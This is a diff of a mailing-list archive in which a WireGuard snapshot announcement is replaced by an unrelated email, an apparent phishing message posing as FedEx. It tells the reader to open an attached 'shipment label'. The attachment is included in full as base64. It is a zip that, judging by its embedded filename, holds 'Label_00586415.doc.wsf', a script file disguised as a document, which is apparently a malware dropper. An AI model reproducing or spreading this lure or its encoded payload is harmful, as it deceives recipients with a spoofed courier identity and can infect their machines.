@@ -1,22 +1,17 @@
-Return-Path: Jason@zx2c4.com
-Received: from frisell.zx2c4.com (frisell.zx2c4.com [192.95.5.64])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 9e23be7a
+Return-Path: root@web9.webkontrol.doruk.net.tr
+Received: from web9.webkontrol.doruk.net.tr (rev.113.3.58.212.doruk.net.tr
+ [212.58.3.113])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 6e52343e
  for <wireguard@lists.zx2c4.com>;
- Tue, 29 Nov 2016 22:13:24 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTP id c45aa199
- for <wireguard@lists.zx2c4.com>;
- Tue, 29 Nov 2016 22:13:23 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTPSA id 3a5b2759
- (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256:NO)
- for <wireguard@lists.zx2c4.com>;
- Tue, 29 Nov 2016 22:13:23 +0000 (UTC)
-Date: Tue, 29 Nov 2016 23:17:50 +0100
-To: "WireGuard mailing list" <wireguard@lists.zx2c4.com>
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Subject: [ANNOUNCE] Snapshot `experimental-0.0.20161129` Available
+ Wed, 30 Nov 2016 06:37:04 +0000 (UTC)
+To: wireguard@lists.zx2c4.com
+Subject: Problem with parcel shipping, ID:00586415
+Date: Tue, 29 Nov 2016 14:51:03 +0200
+From: "FedEx Ground" <tommy.stover@interomega.com.tr>
+Message-ID: <13a70af81a0836a60d6547bf3860418a@interomega.com.tr>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Message-Id: <ffffffffe4df954a@frisell.zx2c4.com>
+Content-Type: multipart/mixed; boundary="b1_ca3092039694ff5760cbff6dfd3e91da"
+Reply-To: FedEx Ground <tommy.stover@interomega.com.tr>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
@@ -26,84 +21,77 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
 
-Hello,
+--b1_ca3092039694ff5760cbff6dfd3e91da
+Content-Type: text/plain; charset=us-ascii
 
-A new experimental snapshot, `experimental-0.0.20161129`, has been tagged in
-the git repository.
+Dear Customer,
 
-Please note that this snapshot is, like the rest of the project at this point
-in time, experimental, and does not consitute a real release that would be
-considered secure and bug-free. However, if you'd like to test this snapshot
-out, there are a few relevent changes.
+Courier was unable to deliver the parcel to you.
+Please, open email attachment to print shipment label.
 
-== Changes ==
-
-  * send: send packet initiation only after requeuing to prevent race
-  * tests: be sure we get all messages
-  * tests: veth does not come up immediately
-  
-  We've made the internal testing suite a bit more reliable.
-  
-  * main: add version to dmesg
-  
-  The module insertion message now shows the snapshot build date or the git
-  revision, depending, which will help with more easily determining what's
-  happening from people's logs. Too many incompetent bug reporters have
-  inexplicably neglected to mention the version or commit being used when
-  reporting a bug. This commit works around this human error, requested by
-  Kalin Kozhuharov and others.
-  
-  * device: conntrack is optional
-  
-  WireGuard can now run on machines that do not have connection tracking,
-  requested by Willy Tarreau and Baptiste Jonglez.
-  
-  * ratelimiter: load hashlimit at modinsert time
-  
-  Alex Xu pointed out an interesting deadlock, and we were able to trace it to
-  internal kernel infrastructure locking things in opposing orders. To work
-  around these bugs, WireGuard now loads the hashlimit module at insertion time
-  rather than at interface creation time.
-  
-  * tools: warn about clock going backward
-  
-  In the event that some script on your system is making the clock go wild
-  backward, the tools should probably indicate that the "last handshake
-  completed" date can't be correct, and that subsequent connections might fail.
-  This was reported by W. Kennington.
-
-As always, the source is available at https://git.zx2c4.com/WireGuard/ and
-information about the project is available at https://www.wireguard.io/ .
-
-This snapshot is available in tarball form here:
-  https://git.zx2c4.com/WireGuard/snapshot/WireGuard-experimental-0.0.20161129.tar.xz
-  SHA256: 7bdce3e56aaae91b195b8bbf7afc8d07f68632c997aa702c1ab84745c099d1b7
-
-If you're a snapshot package maintainer, please bump your package version. If
-you're a user, the WireGuard team welcomes any and all feedback on this latest
-snapshot.
-
-Thank you,
-Jason Donenfeld
+Thank you for choosing FedEx,
+Tommy Stover,
+FedEx Delivery Agent.
 
 
------BEGIN PGP SIGNATURE-----
+--b1_ca3092039694ff5760cbff6dfd3e91da
+Content-Type: application/zip; name="Label_00586415.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Label_00586415.zip
 
-iQJEBAEBCAAuFiEEq5lC5tSkz8NBJiCnSfxwEqXeA64FAlg9/nEQHGphc29uQHp4
-MmM0LmNvbQAKCRBJ/HASpd4Drm3IEADIgOLo+qJWnwVVQ5E9oRzqBI+qd/2FCeyi
-+vR7D0SogSKckwcIV1rXocmz3emGgFJQnUcLmJNC6Nm0QirPE2dsdmNRBMrNmvFh
-XeelxPyqH3UmLLS1iSs8p6mCz1Q3kqVXtqzbw+0wz827ViW3DilQ3jy/h/4uuuCI
-6moXfCO+rw+ATP+hlL74amuR5sLQJ/XkhTcWA1ycSAMVyfnf0jK7SOe3ZcmrNQkO
-p6AN8GsQin7oXX2mt3jXOV1poQe6m5HUZGJ6VfLTYkfz6+aTZzyAIU//2lziQU2d
-0LE2QJvWfPKTjqvAR86zs2BjABw/w6TKIO9Pey+r6vj24Jiwu5Lmds4/hzz7Rvtd
-YVluuUoRwzMgdBH73ZSXMA6pKvsoD8Gew8SinXyH6RHrookqhjZS1IUyEpq3DClT
-1fRZC6slWaMk0Ur4evkd7hJYLT9OK9cLH4WRpTNeJPIK0eHaY8BEyKI+AVudltJ1
-879HFVMvyk9zHe/pNyfHXHnSDCq+H8wFCspK6OyHdYdL8Sk6vn9fC3OnB5niILYn
-/4CRcNVPq4eelgJ9g1WoG2LWAeqdKIDadh/fJhObv8ggQlMTAMzU6pEo7W/flYP9
-HvLwPgGQBFV13NuP3xusv7V2Qss4hsUOcVh1e5qNhx5rdk4NAbKNeBDAfqWzs3uP
-DHQTz79OtA==
-=uNdL
------END PGP SIGNATURE-----
+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
+
+
+--b1_ca3092039694ff5760cbff6dfd3e91da--
